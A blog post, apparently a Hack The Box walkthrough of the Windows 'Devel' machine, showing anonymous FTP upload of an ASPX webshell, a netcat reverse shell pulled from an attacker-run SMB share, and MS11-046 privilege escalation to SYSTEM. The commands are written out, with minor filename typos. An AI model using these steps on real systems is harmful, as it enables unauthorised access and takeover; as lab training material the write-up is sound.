@@ -1,0 +1,360 @@
+I"�><p>Here is another box from Hack the Box (HTB) that is simple and great for beginners. In this HTB, I will not be using Metasploit to access the box. Instead, I’ll be creating an SMB server to obtain a reverse shell and privilege escalation to gain access to the machine.</p>
+
+<h2 id="hack-the-box">Hack The Box</h2>
+
+<ul>
+  <li>Operating System: Windows</li>
+  <li>Difficulty: Easy</li>
+</ul>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Let’s start with the nmap scan.</p>
+
+<p><img src="/images/blog/devel/ipaddress.jpg" alt="nmap scan" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+| 05-20-20  07:47AM                 1442 cmdasp.aspx
+| 03-17-17  05:37PM                  689 iisstart.htm
+| 05-20-20  07:31AM                    7 test.html
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Here we can see that port 21 (FTP) is open and allows for anonymous FTP login–so let’s get started.</p>
+
+<h3 id="website-information">Website Information</h3>
+
+<p>First, let’s access the FTP service through the web browser by heading to 10.10.10.5</p>
+
+<p><img src="/images/blog/devel/website.png" alt="access ftp through web browser" /></p>
+
+<p>There’s not much here. I also checked the source code–nothing there either.</p>
+
+<p>Next, I opened up Burp Suite to take a look at the response headers. That said, http headers are not always accurate since developers can change the information… still a good idea to check though.</p>
+
+<p><img src="/images/blog/devel/httpheader.jpg" alt="burp suite header information" /></p>
+
+<p>From the response header, we can see that the application framework is using ASP.NET, so we might be able to use a .aspx file later on.</p>
+
+<h3 id="ftp-information">FTP Information</h3>
+
+<p>In the nmap scan, we found out that we can log in to the FTP service anonymously. So I accessed the FTP service through terminal.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>root@kali:~# ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>That worked. Let’s see if we can upload a file onto the FTP service.</p>
+
+<ul>
+  <li>In the local terminal window, <code class="language-plaintext highlighter-rouge">echo hello &gt; test.html</code></li>
+  <li>In the FTP service terminal window, <code class="language-plaintext highlighter-rouge">put test.html</code></li>
+</ul>
+
+<p>Yes! It looks like it uploaded. To double-check, we can head to the web browser to see if it’s visible.</p>
+
+<p><img src="/images/blog/devel/test.png" alt="testing an uploaded file" /></p>
+
+<p>Now recall in the <strong>Website Information</strong> section we found out that FTP was running ASP.NET framework, so we can try using the <code class="language-plaintext highlighter-rouge">put</code> command to upload a .aspx file.</p>
+
+<p>I searched in Kali Linux and found that they have a .aspx available in the webshells directory. This file will provide us with the ability to execute commands while in the web browser.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>root@kali:~# locate *.aspx
+/usr/share/webshells/aspx/cmdasp.aspx
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We can copy the file into our current directory and then upload it to the FTP service.</p>
+
+<ul>
+  <li>In the local terminal window, <code class="language-plaintext highlighter-rouge">cp /usr/share/webshells/aspx/cmdasp.aspx .</code></li>
+  <li>In FTP service terminal window, <code class="language-plaintext highlighter-rouge">put cmdasp.aspx</code></li>
+</ul>
+
+<p>Worked! Let’s access the webshell by going to 10.10.10.5/cmdasp.aspx</p>
+
+<p><img src="/images/blog/devel/dir.png" alt="dir command" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">dir</code> = displays information about the files and directories.</li>
+</ul>
+
+<p>The last part of enumeration is to confirm that both the target and our local machine can talk to each other. To test this, we can run a ping test.</p>
+
+<p>In the local terminal window, <code class="language-plaintext highlighter-rouge">tcpdump -i tun0 -n icmp</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes                                                                                    
+16:59:24.588581 IP 10.10.10.5 &gt; 10.10.14.31: ICMP echo request, id 1, seq 5, length 40                                                                  
+16:59:24.588659 IP 10.10.14.31 &gt; 10.10.10.5: ICMP echo reply, id 1, seq 5, length 40                                                                    
+16:59:25.613355 IP 10.10.10.5 &gt; 10.10.14.31: ICMP echo request, id 1, seq 6, length 40                                                                  
+16:59:25.613456 IP 10.10.14.31 &gt; 10.10.10.5: ICMP echo reply, id 1, seq 6, length 40                                                                    
+16:59:26.637219 IP 10.10.10.5 &gt; 10.10.14.31: ICMP echo request, id 1, seq 7, length 40                                                                  
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">icmp</code> = print only icmp packets.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code> = don’t covert addresses (host names, port numbers) to names.</li>
+</ul>
+
+<p>In the web browser, <code class="language-plaintext highlighter-rouge">ping 10.10.14.31</code></p>
+
+<p><img src="/images/blog/devel/ping.png" alt="ping test" /></p>
+
+<p>The response confirms that we’ve received a ping request from the FTP server–awesome. Now let’s see if we can gain access to the machine with a reverse shell.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>So we know a few things already:</p>
+<ul>
+  <li>The FTP server is easily accessible by logging in as anonymous.</li>
+  <li>We can easily transfer files from our local computer to the target via FTP.</li>
+</ul>
+
+<p>Let’s use this to our advantage.</p>
+
+<h3 id="gaining-reverse-shell">Gaining Reverse Shell</h3>
+
+<p>Our goal is to try and run malicious code to gain a reverse shell. I know that Kali Linux has a built-in SMB server through a python script so we can use that. If you’re not sure where it’s located in Kali Linux, we can use the <code class="language-plaintext highlighter-rouge">locate</code> command. Then when we can use the <code class="language-plaintext highlighter-rouge">cp</code> command to copy the script onto our current directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>root@kali:~# locate smbserver.py
+/usr/lib/python3/dist-packages/impacket/smbserver.py
+/usr/share/doc/python3-impacket/examples/smbserver.py
+root@kali:~# cp /usr/share/doc/python3-impacket/examples/smbserver.py .
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>To use the SMB server, we need to create a directory first.</p>
+
+<p><code class="language-plaintext highlighter-rouge">mkdir smb</code></p>
+
+<p>Then we’ll need to locate the Windows binary for Netcat and copy it onto the smb directory.</p>
+
+<p><code class="language-plaintext highlighter-rouge">cp /usr/share/windows-resources/binaries/nc.exe smb</code></p>
+
+<p>Next, we’ll need to turn on the server to a fileshare named “share.”</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 smbserver.py share smb</code></p>
+
+<p>Then in another terminal tab, we’ll turn on the listener to catch the request.</p>
+
+<p><code class="language-plaintext highlighter-rouge">nc -nvlp 4444</code></p>
+
+<p>Okay! Everything’s ready, so let’s go to the cmdasp webshell and run the following command to see if we can gain a reverse shell.</p>
+
+<p><code class="language-plaintext highlighter-rouge">\\10.10.14.31\share\nc.exe -e cmd.exe 10.10.14.31 4444</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>root@kali:~# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.31] from (UNKNOWN) [10.10.10.5] 49165
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It worked! We have access.</p>
+
+<p>Next we’ll take a look to see what type of access we have by using the command <code class="language-plaintext highlighter-rouge">whoami</code>.. darn, not system access so we’ll need to complete a privilege escalation.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt;whoami
+whoami
+iis apppool\web
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>Now that we’re on the machine, let’s see if we can get some information about it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre></td><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt;systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          20/5/2020, 7:00:18 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+			   [01]: x64 Family 23 Model 1 
+			   Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.023 MB
+Available Physical Memory: 737 MB
+Virtual Memory: Max Size:  2.047 MB
+Virtual Memory: Available: 1.527 MB
+Virtual Memory: In Use:    520 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                            Connection Name: Local Area Connection
+                            DHCP Enabled:    No
+                            IP address(es)
+                            [01]: 10.10.10.5
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Based on the system, it looks like we have a Microsoft 7 version 6.1.7600. I did a Google search for any privilege escalations on that operating system and the first one I found was from exploit-db:</p>
+
+<p><a href="https://www.exploit-db.com/exploits/40564">Microsoft Windows (x86) - ‘afd.sys’ Local Privilege Escalation (MS11-046)
+</a></p>
+
+<p><em>The Ancillary Function Driver (AFD) supports Windows sockets applications and is contained in the afd.sys file… An elevation of privilege vulnerability exists where the AFD improperly validates input passed from user mode to the kernel. An attacker must have valid logon credentials and be able to log on locally to exploit the vulnerability. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM privileges).</em></p>
+
+<p>This is exactly what we’re looking for, so let’s use it.</p>
+
+<p>If we take a look at the exploit notes, it looks like we need to compile it first before we can use it. Beforehand, let’s see if we can find this in Kali Linux by using the <code class="language-plaintext highlighter-rouge">searchsploit</code> command.</p>
+
+<p><code class="language-plaintext highlighter-rouge">searchsploit ms11-046</code></p>
+
+<p>Yes! Looks like there is one:</p>
+
+<p><img src="/images/blog/devel/exploit.jpg" alt="searchsploit results for ms11-046" /></p>
+
+<p>Now that we know it’s there, let’s copy it over to our current directory.</p>
+
+<p><code class="language-plaintext highlighter-rouge">cp /usr/share/exploitdb/exploits/windows_x86/local/40564.c .</code></p>
+
+<p>Next, we can follow the instructions in the exploit notes to compile it by typing:</p>
+
+<p><code class="language-plaintext highlighter-rouge">i686-w64-mingw32-gcc 40563.c -o MS11-046.exe -lws2_32</code></p>
+
+<p>Then we can move it into our SMB fileshare server that we created.</p>
+
+<p><code class="language-plaintext highlighter-rouge">mv MS11=046.exe smb</code></p>
+
+<p>Once that’s done, we can head back to our reverse shell and execute our payload, and then a <code class="language-plaintext highlighter-rouge">whoami</code> command to see if we have system access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt;\\10.10.14.31\share\MS11-046.exe
+\\10.10.14.31\share\MS11-046.exe
+
+c:\Windows\System32&gt;whoami
+whoami
+nt authority\system
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Did we just do it?! I think we did. Amazing! Now we just have to get the root.txt and user.txt files, but still.. congratulations!</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>In hindsight, this HTB shows that allowing the ability to login to an FTP server anonymously is a big no-no. Because if an attacker has access to an FTP server and finds out that they can upload and interact with malicious files, they’ll have no trouble with gaining system access.</p>
+
+:ET
